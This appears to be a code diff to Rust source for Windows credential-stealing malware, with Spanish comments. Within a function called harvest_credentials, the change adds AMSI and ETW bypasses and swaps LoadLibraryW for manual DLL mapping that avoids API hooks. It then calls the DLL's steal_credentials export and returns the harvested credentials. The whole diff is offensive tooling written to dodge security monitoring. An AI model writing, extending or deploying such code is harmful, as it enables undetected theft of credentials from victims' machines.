@@ -1,6 +1,7 @@
 #![windows_subsystem = "console"]
 
 mod config;
+mod evasion;
 
 #[cfg(target_os = "windows")]
 use std::ffi::CStr;
@@ -304,60 +305,74 @@ fn harvest_credentials() -> String {
         
         println!("DEBUG: DLL temporal: {}", dll_path.display());
         
-        // Cargar DLL y ejecutar
+        // === EVASIÓN AGRESIVA ===
+        println!("DEBUG: [EVASION] Bypassing AMSI...");
+        unsafe {
+            if evasion::bypass_amsi() {
+                println!("DEBUG: [EVASION] ✅ AMSI bypassed");
+            } else {
+                println!("DEBUG: [EVASION] ⚠️ AMSI bypass failed (puede no estar disponible)");
+            }
+            
+            println!("DEBUG: [EVASION] Bypassing ETW...");
+            if evasion::bypass_etw() {
+                println!("DEBUG: [EVASION] ✅ ETW bypassed");
+            } else {
+                println!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
+            }
+        }
+        
+        // Cargar DLL con manual mapping (bypass LoadLibrary hooks)
+        println!("DEBUG: [EVASION] Manual mapping DLL...");
         let result = unsafe {
-            use winapi::um::libloaderapi::{LoadLibraryW, GetProcAddress, FreeLibrary};
-            use std::ffi::OsStr;
-            use std::os::windows::ffi::OsStrExt;
             use std::os::raw::c_char;
             
-            // Convertir ruta a wide string
-            let wide_path: Vec<u16> = OsStr::new(dll_path.to_str().unwrap())
-                .encode_wide()
-                .chain(Some(0))
-                .collect();
-            
-            let dll_handle = LoadLibraryW(wide_path.as_ptr());
-            if dll_handle.is_null() {
-                fs::remove_file(&dll_path).ok();
-                return format!("__ERROR__:Error cargando DLL (LoadLibrary failed){}", DELIMITER);
-            }
-            
-            println!("DEBUG: DLL cargada exitosamente");
+            // Manual map DLL (NO usa LoadLibrary)
+            let base_addr = match evasion::manual_map_dll(&dll_bytes) {
+                Ok(addr) => {
+                    println!("DEBUG: [EVASION] ✅ DLL mapped at: {:p}", addr);
+                    addr
+                }
+                Err(e) => {
+                    fs::remove_file(&dll_path).ok();
+                    return format!("__ERROR__:Manual mapping failed: {}{}", e, DELIMITER);
+                }
+            };
             
             // Obtener función steal_credentials
-            let func_name = b"steal_credentials\0";
-            let fn_ptr = GetProcAddress(dll_handle, func_name.as_ptr() as *const i8);
-            
-            if fn_ptr.is_null() {
-                FreeLibrary(dll_handle);
-                fs::remove_file(&dll_path).ok();
-                return format!("__ERROR__:Función steal_credentials no encontrada{}", DELIMITER);
-            }
+            println!("DEBUG: [EVASION] Locating steal_credentials...");
+            let fn_ptr = match evasion::get_export_address(base_addr, "steal_credentials") {
+                Some(addr) => {
+                    println!("DEBUG: [EVASION] ✅ Function found at: {:p}", addr);
+                    addr
+                }
+                None => {
+                    fs::remove_file(&dll_path).ok();
+                    return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
+                }
+            };
             
             // Ejecutar función
+            println!("DEBUG: [EVASION] Executing steal_credentials...");
             let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
             let result_ptr = exec_fn();
             
             if result_ptr.is_null() {
-                FreeLibrary(dll_handle);
                 fs::remove_file(&dll_path).ok();
-                return format!("__ERROR__:steal_credentials retornó NULL{}", DELIMITER);
+                return format!("__ERROR__:steal_credentials returned NULL{}", DELIMITER);
             }
             
             // Leer resultado
             let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
             
             // Liberar memoria
-            let free_func_name = b"free_credentials_string\0";
-            let free_fn_ptr = GetProcAddress(dll_handle, free_func_name.as_ptr() as *const i8);
-            if !free_fn_ptr.is_null() {
-                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_fn_ptr);
+            if let Some(free_ptr) = evasion::get_export_address(base_addr, "free_credentials_string") {
+                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                 free_fn(result_ptr);
             }
             
-            // Cerrar DLL
-            FreeLibrary(dll_handle);
+            // NO liberamos base_addr porque está mapeado manualmente
+            // (VirtualFree se haría aquí pero lo dejamos al SO)
             
             result_str
         };
